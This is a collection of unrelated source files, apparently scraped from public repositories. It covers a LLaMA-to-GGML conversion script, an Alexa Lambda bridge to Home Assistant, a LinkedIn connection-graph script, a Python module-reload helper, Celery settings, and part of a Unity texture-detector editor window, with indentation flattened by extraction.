 pickle_paths = [name for name in zf.namelist() if name.endswith('.pkl')]
 assert len(pickle_paths) == 1, pickle_paths
 pickle_fp = zf.open(pickle_paths[0], 'r')
 unpickler = LazyUnpickler(pickle_fp,
 data_base_path = pickle_paths[0][:-4],
 zip_file = zf)
 model = unpickler.load()
 return dict(model.items())


In = TypeVar('In')
Out = TypeVar('Out')
def bounded_parallel_map(func: Callable[[In], Out], iterable: Iterable[In], concurrency: int) -> Iterable[Out]:
 with concurrent.futures.ThreadPoolExecutor() as executor:
 futures: list[concurrent.futures.Future[Out]] = []
 items_rev = list(iterable)[::-1]
 for i in range(min(concurrency, len(items_rev))):
 futures.append(executor.submit(func, items_rev.pop()))
 while futures:
 result = futures.pop(0).result()
 if items_rev:
 futures.append(executor.submit(func, items_rev.pop()))
 yield result


def check_vocab_size(params: Params, vocab: Vocab) -> None:
 if params.n_vocab != vocab.vocab_size:
 if params.n_vocab == vocab.vocab_size_base:
 print(""Ignoring added_tokens.json since model matches vocab size without it."")
 vocab.added_tokens_list = []
 vocab.vocab_size = vocab.vocab_size_base
 return
 msg = f""Vocab size mismatch (model has {params.n_vocab}, but {vocab.fname_tokenizer}""
 if vocab.fname_added_tokens is not None:
 msg += f"" combined with {vocab.fname_added_tokens}""
 msg += f"" has {vocab.vocab_size}).""
 if vocab.vocab_size < params.n_vocab < vocab.vocab_size + 20 and vocab.fname_added_tokens is None:
 msg += f""  Most likely you are missing added_tokens.json (should be in {vocab.fname_tokenizer.parent}).""
 msg += f""  Most likely added_tokens.json should not be present.""
 raise Exception(msg)


class OutputFile:
 def __init__(self, fname_out: Path) -> None:
 self.fout = open(fname_out, ""wb"")


 def write_file_header(self, params: Params) -> None:
 values = [
 0x67676d66,  # magic: ggmf in hex
 1, # file version
 params.n_vocab,
 params.n_embd,
 params.n_mult,
 params.n_head,
 params.n_layer,
 params.n_embd // params.n_head,  # rot (obsolete)
 params.file_type,
        ]
 self.fout.write(struct.pack(""i"" * len(values), *values))


 def write_tensor_header(self, name: str, shape: Sequence[int], data_type: DataType) -> None:
 sname = name.encode('utf-8')
 self.fout.write(struct.pack(""iii"", len(shape), len(sname), DATA_TYPE_TO_FTYPE[data_type]))
 self.fout.write(struct.pack(""i"" * len(shape), *shape[::-1]))
 self.fout.write(sname)


 def write_vocab(self, vocab: Vocab) -> None:
 for text, score in vocab.all_tokens():
 self.fout.write(struct.pack(""i"", len(text)))
 self.fout.write(text)
 self.fout.write(struct.pack(""f"", score))


 @staticmethod
 def write_vocab_only(fname_out: Path, vocab: Vocab) -> None:
 of = OutputFile(fname_out)
 params = Params(n_vocab = vocab.vocab_size, n_embd = 0, n_mult = 0,
 n_head = 1, n_layer = 0, file_type = 0)
 of = OutputFile(fname_out)
 of.write_file_header(params)
 of.write_vocab(vocab)
 of.fout.close()


 @staticmethod
 def write_all(fname_out: Path, params: Params, model: LazyModel, vocab: Vocab) -> None:
 check_vocab_size(params, vocab)
 of = OutputFile(fname_out)
 of.write_file_header(params)
 print(f""Writing vocab..."")
 of.write_vocab(vocab)


 ndarrays = bounded_parallel_map(lambda lazy_tensor: lazy_tensor.load().ggml_ndarray(), model.values(),
 concurrency=8)
 for i, ((name, lazy_tensor), ndarray) in enumerate(zip(model.items(), ndarrays)):
 size = ' x '.join(map(str, lazy_tensor.shape))
 print(f""[{i+1}/{len(model)}] Writing tensor {name}, size {size}..."")
 of.write_tensor_header(name, lazy_tensor.shape, lazy_tensor.data_type)
 ndarray.tofile(of.fout)
 of.fout.close()


def do_necessary_conversions(model: LazyModel, convert_to_float16: bool) -> LazyModel:
 out: LazyModel = model.copy()


 if model[""layers.0.attention.wq.weight""].data_type == DataType.Q4_1:
 # GPTQ models may need F32->F16 for these tensors
 for name in [""tok_embeddings.weight"", ""output.weight""]:
 out[name] = out[name].astype(DataType.F16)
 if convert_to_float16:
 raise Exception(""--convert-to-float16 is not useful with GPTQ models"")


 converted = 0
 for name in out:
 if always_want_f32(name):
 out[name] = out[name].astype(DataType.F32)
 elif convert_to_float16 and out[name].data_type == DataType.F32:
 out[name] = out[name].astype(DataType.F16)
 converted += 1


 if convert_to_float16 and not converted:
 raise Exception(""This model is already float16 and cannot be converted."")


 return out


def load_some_model(path: Path) -> tuple[LazyModel, Path]:
 '''Load a model of either supported format; return the model and the path where it was found.'''
 # Be extra-friendly and accept either a file or a directory:
 if path.is_dir():
 globs = [""consolidated.00.pth"", ""pytorch_model-00001-of-*.bin"", ""*.pt""]
 files = [file for glob in globs for file in path.glob(glob)]
 if not files:
 raise Exception(f""Can't find model in directory {path}"")
 if len(files) > 1:
 raise Exception(f""Found multiple models in {path}, not sure which to pick: {files}"")
 path = files[0]
 model = lazy_load_torch(path)
 if ""tok_embeddings.weight"" in model:
 return load_orig_llama_file(path, model), path
 else:
 return load_transformers_file(path, model), path


def filter_and_sort_tensors(model: LazyModel) -> LazyModel:
 return {name: model[name] for name in TENSORS_LIST if name in model}


def load_vocab(path: Path) -> Vocab:
 # Be extra-friendly and accept either a file or a directory.  Also, if it's
 # a directory, it might be the model directory, and tokenizer.model might
 # be in the parent of that.
 if path.is_dir():
 path2 = path / ""tokenizer.model""
 # Use `.parent` instead of /.. to handle the symlink case better.
 path3 = path.parent / ""tokenizer.model""
 if path2.exists():
 path = path2
 elif path3.exists():
 path = path3
 else:
 raise FileNotFoundError(f""Could not find tokenizer.model in {path} or its parent; try passing --vocab-dir"")
 added_tokens_path = path.parent / ""added_tokens.json""
 return Vocab(path, added_tokens_path if added_tokens_path.exists() else None)


def default_outfile(model_path: Path, params: Params) -> Path:
 namestr = {0: ""f32"", 1: ""f16"", 3: ""q4_1"", 4: ""q4_1""}[params.file_type]
 return model_path.parent / f""ggml-model-{namestr}.bin""


def main() -> None:
 parser = argparse.ArgumentParser(description=""Convert a LLaMa model to a GGML compatible file"")
 parser.add_argument(""--vocab-only"", action=""store_true"", help=""extract only the vocab"")
 parser.add_argument(""--convert-to-float16"", action=""store_true"", help=""convert float32 to float16"")
 parser.add_argument(""--vocab-dir"", type=Path, help=""directory containing tokenizer.model, if separate from model file"")
 parser.add_argument(""--outfile"", type=Path, help=""path to write to; default: based on input"")
 parser.add_argument(""model"", type=Path, help=""directory containing model file, or model file itself (*.pth, *.pt, *.bin)"")
 args = parser.parse_args()


 if args.vocab_only:
 vocab = load_vocab(args.vocab_dir or args.model)
 assert args.outfile, ""need --outfile if using --vocab-only""
 OutputFile.write_vocab_only(args.outfile, vocab)
 else:
 model, model_path = load_some_model(args.model)
 vocab_dir = args.vocab_dir if args.vocab_dir else model_path.parent
 vocab = load_vocab(vocab_dir)
 model = filter_and_sort_tensors(model)
 model = do_necessary_conversions(model, args.convert_to_float16)
 params = Params.guessed(model)
 outfile = args.outfile or default_outfile(model_path, params)
 OutputFile.write_all(outfile, params, model, vocab)
 print(f""Wrote {outfile}"")
main()
{""dim"": 5120, ""multiple_of"": 256, ""n_heads"": 40, ""n_layers"": 40, ""norm_eps"": 1e-06, ""vocab_size"": -1}
==<SEPERATOR>==
lambda_function.py
""""""
Copyright 2019 Jason Hu <awaregit at gmail.com>

Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
""""""
import os
import json
import logging
import urllib3


_debug = bool(os.environ.get('DEBUG'))


_logger = logging.getLogger('HomeAssistant-SmartHome')
_logger.setLevel(logging.DEBUG if _debug else logging.INFO)




def lambda_handler(event, context):
 """"""Handle incoming Alexa directive.""""""
 
 _logger.debug('Event: %s', event)


 base_url = os.environ.get('BASE_URL')
 assert base_url is not None, 'Please set BASE_URL environment variable'
 base_url = base_url.strip(""/"")


 directive = event.get('directive')
 assert directive is not None, 'Malformatted request - missing directive'
 assert directive.get('header', {}).get('payloadVersion') == '3', \
 'Only support payloadVersion == 3'
 
 scope = directive.get('endpoint', {}).get('scope')
 if scope is None:
 # token is in grantee for Linking directive 
 scope = directive.get('payload', {}).get('grantee')
 if scope is None:
 # token is in payload for Discovery directive 
 scope = directive.get('payload', {}).get('scope')
 assert scope is not None, 'Malformatted request - missing endpoint.scope'
 assert scope.get('type') == 'BearerToken', 'Only support BearerToken'


 token = scope.get('token')
 if token is None and _debug:
 token = os.environ.get('LONG_LIVED_ACCESS_TOKEN')  # only for debug purpose
 
 verify_ssl = not bool(os.environ.get('NOT_VERIFY_SSL'))
 
 http = urllib3.PoolManager(
 cert_reqs='CERT_REQUIRED' if verify_ssl else 'CERT_NONE',
 timeout=urllib3.Timeout(connect=2.0, read=10.0)
    )
 
 response = http.request(
 'POST', 
 '{}/api/alexa/smart_home'.format(base_url),
 headers={
 'Authorization': 'Bearer {}'.format(token),
 'Content-Type': 'application/json',
        },
 body=json.dumps(event).encode('utf-8'),
    )
 if response.status >= 400:
 return {
 'event': {
 'payload': {
 'type': 'INVALID_AUTHORIZATION_CREDENTIAL' 
 if response.status in (401, 403) else 'INTERNAL_ERROR',
 'message': response.data.decode(""utf-8""),
                }
            }
        }
 _logger.debug('Response: %s', response.data.decode(""utf-8""))
 return json.loads(response.data.decode('utf-8'))
==<SEPERATOR>==
linkedin-query.py
#!/usr/bin/env python
# encoding: utf-8
""""""
linkedin-query.py

Created by Thomas Cabrol on 2012-12-03.
Customised by Rik Van Bruggen
Copyright (c) 2012 dataiku. All rights reserved.

Building the LinkedIn Graph
""""""


import oauth2 as oauth
import urlparse
import simplejson
import codecs


CONSUMER_KEY = ""your-consumer-key-here""
CONSUMER_SECRET = ""your-consumer-secret-here""
OAUTH_TOKEN = ""your-oauth-token-here""
OAUTH_TOKEN_SECRET = ""your-oauth-token-secret-here""


OUTPUT = ""linked.csv""


def linkedin_connections():
 # Use your credentials to build the oauth client
 consumer = oauth.Consumer(key=CONSUMER_KEY, secret=CONSUMER_SECRET)
 token = oauth.Token(key=OAUTH_TOKEN, secret=OAUTH_TOKEN_SECRET)
 client = oauth.Client(consumer, token)
 # Fetch first degree connections
 resp, content = client.request('http://api.linkedin.com/v1/people/~/connections?format=json')
 results = simplejson.loads(content)    
 # File that will store the results
 output = codecs.open(OUTPUT, 'w', 'utf-8')
 # Loop thru the 1st degree connection and see how they connect to each other
 for result in results[""values""]:
 con = ""%s %s"" % (result[""firstName""].replace("","", "" ""), result[""lastName""].replace("","", "" ""))
 # Note that you will have to replace ""YOURNAME"" with YOUR OWN NAME, associated with the username that you are using for the query
 print >>output, ""%s,%s"" % (""YOURNAME"",  con)
 # This is the trick, use the search API to get related connections
 u = ""https://api.linkedin.com/v1/people/%s:(relation-to-viewer:(related-connections))?format=json"" % result[""id""]
 resp, content = client.request(u)
 rels = simplejson.loads(content)
 try:
 for rel in rels['relationToViewer']['relatedConnections']['values']:
 sec = ""%s %s"" % (rel[""firstName""].replace("","", "" ""), rel[""lastName""].replace("","", "" ""))
 print >>output, ""%s,%s"" % (con, sec)
 except:
 pass
 


if __name__ == '__main__':
 linkedin_connections()
"
"reloadd.py
","# -*- coding: utf-8 -*-
import sys
from types import ModuleType, ClassType


def can_reload_methods(klass):
 klass.__CAN_RELOAD_METHODS__ = True
 return klass
 


def reloadd(m):
 """"""
        ``m`` can be a string or an actual module
 
        Any classes in the module that are decorated with ``@can_reload_methods``
        will have their old class methods updated to the new version, meaning 
        that any existing instances of the class will now be using the new methods.
 
        This is not a silver bullet at all, but in many cases it will be useful.
 
        If the module is not in the module cache we just don't do anything here.
 
        Example
        -----
 
        Imagine we have a class ``someClass`` in a module ``someModule``. First
        we create an instance, ``a``, of the class and call one of its functions::

            import someModule
            a = someModule.someClass()
            a.something()
            >>> ""this is something version 1""
 
        Next, suppose we go and edit the ``something`` method in ``someModule.py``,
        lets say it should now print ``""this is version 2""``.
 
        Having done that, if we call ``a.something()`` again we will be dissapointed to find that
        the result hasn't changed: we still get ``this is soemthing version  1``.
 
        You might try doing ``reload(someModule)`` but it wont help.   Which is 
        where this special ``reloadd`` function comes in handy::
 
            reloadd(someModule)
            a.something()
            >>> ""this is version 2""
 
        Which is what we wanted.  This is not bullet proof reloading by any means
        but in most cases it should update existing instances of ``someModule`` and
        any instances of classes that use ``someModule`` as a base class.
 
        Note that ``reloadd`` only applies to the single file you specify, it
        does not do any recursion whatsoever...but in most cases that will be
        the behaviour you actually wanted...this can all get seriously confusing.        
 
        Note that for a class to be recognised by ``reloadd`` it needs to be
        decorated with the ``@can_reload_methods`` decorator.  This isn't actually
        a neccessary part of the implementation, but it seems fairly sensible.
        If that's annoying, you could edit this function to reload all classes 
        within the requested module, or have an optional flag.
        (If you add the ``@can_reload_methods`` decorator after creating instances
        and then try and ``reloadd``, the methods will be applied because the
        new version of the class has the decorator even though the old version does not.)
 
        How it works
        ------

        The main idea is to look in the module cache to find the old version of
        the relevant class(es), then do a standard reload, and then overwrite/add
        the new methods to the old class.
 
        This more or less works, but there are some additional complications, the
        most significant of which is that if we want to do repeated ``reloadd`` calls
        we need to be able to chain back to the oldest version of the class, because
        that is the version which has the active instances (well, there may well be
        instances of a variety of different versions of the class and we have to
        update them all.)
 
        Warning
        --------
 
        There are no doubt many unforseen ways this could go wrong.

        Methods and properties are updated.  
 
        Old methods that have been removed are not deleted, i.e.
        only methods named in the new version are updated. 
 
        Not sure about staicmethods, classmethods and methods wrapped with
        other decorators.
 
    """"""
 if isinstance(m,ModuleType) is False and m not in sys.modules: 
 return
 
 name_m = m if isinstance(m,str) else m.__name__
 m = m if isinstance(m,ModuleType) else sys.modules[m]
 
 # We need to have a reference to each of the old classes because the
 # reload that we are about to do will overwrite their names in the module.
 # here we create a dict with (key,value)=(class name, class reference):
 oldClasses = {}
 for key in dir(m):
 val = getattr(m,key)
 if isinstance(val,ClassType) or getattr(val,'__class__',False) is type:
 oldClasses[key] = val 
 
 # Ok, now we can do the reload.
 reload(m)  
 
 # Now that we've done the reload we can get a dict of all the 
 # currently decorated classes, of the same form as oldClasses
 taggedNewClasses = {}
 for key in dir(m):
 val = getattr(m,key)
 if getattr(val,'__module__',None) == name_m and \
 hasattr(val,'__CAN_RELOAD_METHODS__'):
 taggedNewClasses[key] = val
 
 for name_c,c in taggedNewClasses.iteritems():
 if name_c not in oldClasses:
 continue # if we cant find the old version of the class then there's nothing much we can do.


 # For the given class, we don't just want to update the methods in oldClasses[name_c]
 # we also need to follow the chain back through all previous versions of the class
 # (""all"" meaning all versions that were tagged plus the version just before it was tagged)            
 c.__PREVIOUS_VERSION__ = oldClasses[name_c]   
 c_chain = [c.__PREVIOUS_VERSION__]
 while hasattr(c_chain[-1],'__PREVIOUS_VERSION__'):
 c_chain.append(c_chain[-1].__PREVIOUS_VERSION__)


 # Right, lets get a list of all ""method""-like things for the new version of the class
 # These get stored in a dict as (key,value)=(name,reference)
 # Note that we collect the im_func of methods, and the whole of properties
 newMethods = {}
 newProperties = {}
 for attr_name in dir(c):
 attr = getattr(c,attr_name)
 if hasattr(attr,'im_func'):
 newMethods[attr_name] = attr.im_func
 elif isinstance(attr,property):
 newProperties[attr_name] = attr
 
 # Ok, finally we can now iterate over all previous versions of the class
 # and override the old/non-existent attr with the new vesion of the 
 # methods/properties:
 for met_name,met in newMethods.iteritems():
 for c_old in c_chain:
 setattr(c_old,met_name,_enclose(met))
 for prop_name,prop in newProperties.iteritems():
 for c_old in c_chain:
 setattr(c_old,prop_name,prop)                                
 
 
 print ""Updated %d methods and %d properties of %d versions of class %s in module %s."" % \
                (len(newMethods),len(newProperties),len(c_chain),name_c,name_m)
 




def _enclose(met): #builds closure around iterator
 def wrapped(*args,**kwargs):
 return met(*args,**kwargs)
 return wrapped
==<SEPERATOR>==
celery_settings.py
# Recommended Celery Django settings for reliability:
# (use `app.config_from_object('django.conf:settings', namespace='CELERY')`
#  in proj/celery.py module)


from decouple import config # use python-decouple: https://github.com/HBNetwork/python-decouple


# Prefer RabbitMQ over Redis for Broker,
# mainly because RabbitMQ doesn't need visibility timeout. See:
# https://blog.daftcode.pl/working-with-asynchronous-celery-tasks-lessons-learned-32bb7495586b
# https://engineering.instawork.com/celery-eta-tasks-demystified-424b836e4e94
# https://github.com/celery/celery/issues/4400
CELERY_BROKER_URL = config(""CELERY_BROKER_URL"", default="""")


# When RabbitMQ is stressed (out of memory or disk space)
# task.delay/task.apply_async calls will fail silently if confirm_publish is set to False,
# which is the default. It's better to fail loud than silently when this happens See:
# https://github.com/celery/celery/issues/5410
# If confirm_timeout passes, a socket.timeout exception is raised:
CELERY_BROKER_TRANSPORT_OPTIONS = {""confirm_publish"": True, ""confirm_timeout"": 5.0}


# Some cloud providers have low broker connection limits (e.g. cloudamqp),
# to play safe, better to set the broker_pool_limit to 1.
# The actual max number of connections used is equal to:
# broker_pool_limit * (web nodes * web processes + worker nodes * worker concurrency)
CELERY_BROKER_POOL_LIMIT = config(""CELERY_BROKER_POOL_LIMIT"", cast=int, default=1)


# Some cloud providers require a timeout value longer than default one
# for the broker connection (e.g. cloudamqp):
CELERY_BROKER_CONNECTION_TIMEOUT = config(""CELERY_BROKER_CONNECTION_TIMEOUT"", cast=float, default=30.0)


# Prefer Redis over RabbitMQ for result backend,
# as Redis is better suited to work as a key-value store:
CELERY_RESULT_BACKEND = config(""CELERY_RESULT_BACKEND"", default="""")


# Set the maximum number of Redis connections that your cloud provider requires.
# Note this is specifc to the result backend, so you may actually use more:
CELERY_REDIS_MAX_CONNECTIONS = config(""CELERY_REDIS_MAX_CONNECTIONS"", cast=int, default=None)


# THE MOST CRITICAL SETTING:
# task_acks_late = True ensures tasks are automatically re-queued
# in the event of a abrupt shutdown of the worker such as:
# a power failure, a forced restart, worker instance being killed during a deployment.
# Note that you need to ensure your tasks are idempotent, to prevent repeated work.
# See ""Mixing reliability with Celery for delicious async tasks"" talk for more details:
# https://bit.ly/celery-reliability
CELERY_TASK_ACKS_LATE = config(""CELERY_TASK_ACKS_LATE"", cast=bool, default=True)


# By default Celery will ack tasks that failed due to exceptions or timed out
# (based on task_time_limit/time_limit). In general, that's the wanted behavior
# because retries are the recommended way to handle intermittent task failures.
# Since explicit is better than implicit, we keep the default True set here:
CELERY_TASK_ACKS_ON_FAILURE_OR_TIMEOUT = config(
 ""CELERY_TASK_ACKS_ON_FAILURE_OR_TIMEOUT"", cast=bool, default=True
)


# Below we keep Celery's default for tasks abruptly killed by a signal:
# do not requeue the task. For projects with good task stability, no memory leaks,
# no hanging workers, idempotent tasks, and continous deployments
# (workers frequently interrupted), it's safer to set this to True to avoid losing tasks:
CELERY_TASK_REJECT_ON_WORKER_LOST = config(
 ""CELERY_TASK_REJECT_ON_WORKER_LOST"", cast=bool, default=False
)


# Disable task prefetching for workers to increase reliability against lost tasks
# at the cost of higher peak latency. A low prefetch multiplier also prevents
# unbalanced workloads when some tasks are much slower than others.
# See: https://docs.celeryq.dev/en/latest/userguide/optimizing.html#optimizing-prefetch-limit
# Note that 0 means no prefetch limit: the worker will keep consuming messages,
# not respecting that there may be other available worker nodes.
CELERY_WORKER_PREFETCH_MULTIPLIER = config(""CELERY_WORKER_PREFETCH_MULTIPLIER"", cast=int, default=1)


# The number of concurrent worker processes executing tasks.
# If you��re doing mostly I/O you can have more processes, but if mostly CPU-bound,
# better to leave as None, which means the number of CPUs/cores:
CELERY_WORKER_CONCURRENCY = config(""CELERY_WORKER_CONCURRENCY"", cast=int, default=None)


# Automatically restart each worker process after 1000 tasks are processed on it.
# This is possibly an overkill and introduces latency, but it's a good safety net
# against memory leaks:
CELERY_WORKER_MAX_TASKS_PER_CHILD = config(
 ""CELERY_WORKER_MAX_TASKS_PER_CHILD"", cast=int, default=1000
)


# By default Celery doesn't send task events,
# but if you want to use a monitor tool like Flower, you need this:
CELERY_WORKER_SEND_TASK_EVENTS = config(""CELERY_WORKER_SEND_TASK_EVENTS"", cast=bool, default=True)
CELERY_EVENT_QUEUE_EXPIRES = config(""CELERY_EVENT_QUEUE_EXPIRES"", cast=float, default=60.0)
CELERY_EVENT_QUEUE_TTL = config(""CELERY_EVENT_QUEUE_TTL"", cast=float, default=5.0)
# you may also need CELERY_TASK_SEND_SENT_EVENT = True
# to track tasks before they��re consumed by a worker (but Flower doesn't support that).


# Below are two non-Celery settings that you should use and configure:
# always have timeouts for HTTP requests (or any kind of I/O) that happens
# inside Celery tasks. A task that blocks indefinitely may eventually
# stop the worker instance from doing any other work. See warning at:
# https://docs.celeryq.dev/en/stable/userguide/tasks.html
# Note: you must manually read from those settings and configure your HTTP client lib.
# Alternatively, you can set CELERY_TASK_SOFT_TIME_LIMIT and CELERY_TASK_TIME_LIMIT,
# but those introduce latency because they restart worker processes.
TASK_HTTP_CONNECT_TIMEOUT = config(""TASK_HTTP_CONNECT_TIMEOUT"", cast=float, default=5.0)
TASK_HTTP_READ_TIMEOUT = config(""TASK_HTTP_READ_TIMEOUT"", cast=float, default=120.0)


# Sources:
# - https://docs.celeryq.dev/en/stable/userguide/configuration.html
# - https://bit.ly/celery-reliability
# - https://denibertovic.com/posts/celery-best-practices/
# - https://medium.com/squad-engineering/celery-in-production-three-more-years-of-fixing-bugs-2ee462cef39f
# - https://engineering.instawork.com/celery-eta-tasks-demystified-424b836e4e94
# - https://blog.wolt.com/engineering/2021/09/15/5-tips-for-writing-production-ready-celery-tasks/
# - https://adamj.eu/tech/2020/02/03/common-celery-issues-on-django-projects/
# - https://blog.daftcode.pl/working-with-asynchronous-celery-tasks-lessons-learned-32bb7495586b
# - https://italux.medium.com/celery-rabbitmq-common-issues-a741a3800b30
# - https://stackoverflow.com/questions/66978028/application-impacts-of-celery-workers-running-with-the-without-heartbeat-fla
"
"SingleColorTextureDetector.cs
","using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using UnityEditor;
using UnityEngine;
using Object = UnityEngine.Object;


public class SingleColorTextureDetector : EditorWindow, IHasCustomMenu
{
 [Serializable]
 private class SaveData
 {
 public List<string> paths = new List<string>();
 }


 private const string LOW_RES_DUMMY_TEXTURE_PATH = ""Assets/low_dummyy_texturee.png"";
 private const string HIGH_RES_DUMMY_TEXTURE_PATH = ""Assets/high_dummyy_texturee.png"";
 private const string SAVE_FILE_PATH = ""Library/SingleColorAssetDetector.json"";
 private const float BUTTON_DRAG_THRESHOLD_SQR = 600f;


 private readonly MethodInfo instanceIDFromGUID = typeof( AssetDatabase ).GetMethod( ""GetInstanceIDFromGUID"", BindingFlags.NonPublic | BindingFlags.Static );


 private List<string> results = new List<string>(); // This is not readonly so that it can be serialized


 private double lastClickTime;
 private string lastClickedPath;


 private readonly GUIContent buttonGUIContent = new GUIContent();
 private Vector2 buttonPressPosition;
 private Vector2 scrollPos;


 [MenuItem( ""Window/Single Color Texture Detector"" )]
 private static void Init()
 {
 SingleColorTextureDetector window = GetWindow<SingleColorTextureDetector>();
		window.titleContent = new GUIContent( ""Solid Textures"" );
		window.minSize = new Vector2( 200f, 150f );
		window.Show();
 }


 private void Awake()
 {
		LoadSession( null );
 }


 // Show additional options in the window's context menu
 public void AddItemsToMenu( GenericMenu menu )
 {
 if( results.Count > 0 )
			menu.AddItem( new GUIContent( ""Save To Clipboard"" ), false, () => GUIUtility.systemCopyBuffer = JsonUtility.ToJson( new SaveData() { paths = results }, true ) );
 else
			menu.AddDisabledItem( new GUIContent( ""Save To Clipboard"" ) );


 if( string.IsNullOrEmpty( GUIUtility.systemCopyBuffer ) )
			menu.AddDisabledItem( new GUIContent( ""Load From Clipboard"" ) );
 else
 {
			menu.AddItem( new GUIContent( ""Load From Clipboard"" ), false, () =>
 {
 string json = GUIUtility.systemCopyBuffer;
				LoadSession( json );
				SaveSession( json ); // If load succeeds, overwrite the saved session
 } );
 }
 }


 private void OnGUI()
 {
 Event ev = Event.current;
 scrollPos = GUILayout.BeginScrollView( scrollPos );


 // Calculate single color Textures
 if( GUILayout.Button( ""Refresh"" ) )
 {
 try
 {
 double startTime = EditorApplication.timeSinceStartup;


				CalculateSingleColorTextures();
				SaveSession( null );


				Debug.Log( ""Refreshed in "" + ( EditorApplication.timeSinceStartup - startTime ) + "" seconds."" );
 }
 catch( Exception e )
 {
				Debug.LogException( e );
 }
 finally
 {
				EditorUtility.ClearProgressBar();


 if( File.Exists( LOW_RES_DUMMY_TEXTURE_PATH ) )
					AssetDatabase.DeleteAsset( LOW_RES_DUMMY_TEXTURE_PATH );
 if( File.Exists( HIGH_RES_DUMMY_TEXTURE_PATH ) )
					AssetDatabase.DeleteAsset( HIGH_RES_DUMMY_TEXTURE_PATH );
 }


			GUIUtility.ExitGUI();
 }


 // Draw found results
 if( results.Count > 0 )
 {
			EditorGUILayout.HelpBox( ""- Double click a path to select the Texture asset\n- Right/middle click a path to hide it from the list"", MessageType.Info );


 for( int i = 0; i < results.Count; i++ )
 {
 Rect rect = EditorGUILayout.GetControlRect( false, EditorGUIUtility.singleLineHeight + 2f );
				rect.xMin += 3f;
				rect.xMax -= 3f;


 Rect iconRect = new Rect( rect.x, rect.y, rect.height, rect.height );
				rect.xMin += iconRect.width + 2f;


 Texture icon = AssetDatabase.GetCachedIcon( results[i] );
 if( icon )
					EditorGUI.DrawTextureTransparent( iconRect, icon );


 // Buttons must support 1) click and 2) drag & drop. The most reliable way is to simulate GUI.Button from scratch
				buttonGUIContent.text = results[i];
 int buttonControlID = GUIUtility.GetControlID( FocusType.Passive );
 switch( ev.GetTypeForControl( buttonControlID ) )
 {
 case EventType.MouseDown:
 if( rect.Contains( ev.mousePosition ) )
 {
							GUIUtility.hotControl = buttonControlID;
 buttonPressPosition = ev.mousePosition;
 }


 break;
 case EventType.MouseDrag:
 if( GUIUtility.hotControl == buttonControlID && ev.button == 0 && ( ev.mousePosition - buttonPressPosition ).sqrMagnitude >= BUTTON_DRAG_THRESHOLD_SQR )
 {
							GUIUtility.hotControl = 0;


 Object asset = AssetDatabase.LoadMainAssetAtPath( results[i] );
 if( asset )
 {
 // Credit: https://forum.unity.com/threads/editor-draganddrop-bug-system-needs-to-be-initialized-by-unity.219342/#post-1464056
								DragAndDrop.PrepareStartDrag();
								DragAndDrop.objectReferences = new Object[] { asset };
								DragAndDrop.StartDrag( ""DuplicateAssetDetector"" );
 }


							ev.Use();
 }


 break;
 case EventType.MouseUp:
 if( GUIUtility.hotControl == buttonControlID )
 {
							GUIUtility.hotControl = 0;


 if( rect.Contains( ev.mousePosition ) )
 {
 if( ev.button == 0 && File.Exists( results[i] ) )
 {
 // Ping clicked Texture
 double clickTime = EditorApplication.timeSinceStartup;
 if( clickTime - lastClickTime < 0.5f && lastClickedPath == results[i] )
 {
 if( !ev.control && !ev.command && !ev.shift )
											Selection.objects = new Object[] { AssetDatabase.LoadMainAssetAtPath( results[i] ) };
 else
 {
 // While holding CTRL, either add clicked asset to current selection or remove it from current selection
 Object asset = AssetDatabase.LoadMainAssetAtPath( results[i] );
 List<Object> selection = new List<Object>( Selection.objects );
 if( !selection.Remove( asset ) )
												selection.Add( asset );


											Selection.objects = selection.ToArray();
 }
 }
 else if( instanceIDFromGUID != null )
										EditorGUIUtility.PingObject( (int) instanceIDFromGUID.Invoke( null, new object[] { AssetDatabase.AssetPathToGUID( results[i] ) } ) );
 else
										EditorGUIUtility.PingObject( AssetDatabase.LoadMainAssetAtPath( results[i] ) );


 lastClickTime = clickTime;
 lastClickedPath = results[i];
 }
 else if( ev.button == 1 )
 {
 // Show an option to hide that Texture from the list
 int _i = i;
 GenericMenu menu = new GenericMenu();
									menu.AddItem( new GUIContent( ""Hide"" ), false, () => HideTexture( _i ) );
									menu.ShowAsContext();
 }
 else if( ev.button == 2 )
									HideTexture( i );
 }
 }
 break;
 case EventType.Repaint:
						EditorStyles.textField.Draw( rect, buttonGUIContent, buttonControlID );
 break;
 }


 if( ev.isMouse && GUIUtility.hotControl == buttonControlID )
					ev.Use();
 }


			GUILayout.Space( 1f );
 }


		GUILayout.EndScrollView();
 }


 private void CalculateSingleColorTextures()
 {
 // Dummy Texture is used to read Textures' pixels
		CreateDummyTexture( LOW_RES_DUMMY_TEXTURE_PATH, 32 );
		CreateDummyTexture( HIGH_RES_DUMMY_TEXTURE_PATH, 1024 );


		results.Clear();


 string[] textureGUIDs = AssetDatabase.FindAssets( ""t:Texture"" );
 if( textureGUIDs.Length == 0 )
 return;


 string pathsLengthStr = ""/"" + textureGUIDs.Length.ToString();
 float progressMultiplier = 1f / textureGUIDs.Length;


 for( int i = 0; i < textureGUIDs.Length; i++ )
 {
 if( i % 15 == 0 && EditorUtility.DisplayCancelableProgressBar( ""Please wait..."", string.Concat( ""Searching: "", ( i + 1 ).ToString(), pathsLengthStr ), ( i + 1 ) * progressMultiplier ) )
 throw new Exception( ""Search aborted"" );


 if( string.IsNullOrEmpty( textureGUIDs[i] ) )
 continue;


 string path = AssetDatabase.GUIDToAssetPath( textureGUIDs[i] );
 if( string.IsNullOrEmpty( path ) || !path.StartsWith( ""Assets/"" ) || path == LOW_RES_DUMMY_TEXTURE_PATH || path == HIGH_RES_DUMMY_TEXTURE_PATH )
 continue;


 // Happens for Font Assets' Textures, for example
 if( !typeof( Texture ).IsAssignableFrom( AssetDatabase.GetMainAssetTypeAtPath( path ) ) )
 continue;


 // First downscale the Texture to 32 pixels for performance reasons, then downscale it to 1024 pixels to verify the result
 if( CheckTextureAtPath( path, LOW_RES_DUMMY_TEXTURE_PATH ) && CheckTextureAtPath( path, HIGH_RES_DUMMY_TEXTURE_PATH ) )
				results.Add( path );
 }
 }


 // Creates dummy Texture asset that will be used to read Textures' pixels
 private void CreateDummyTexture( string path, int maxSize )
 {
 if( !File.Exists( path ) )
 {
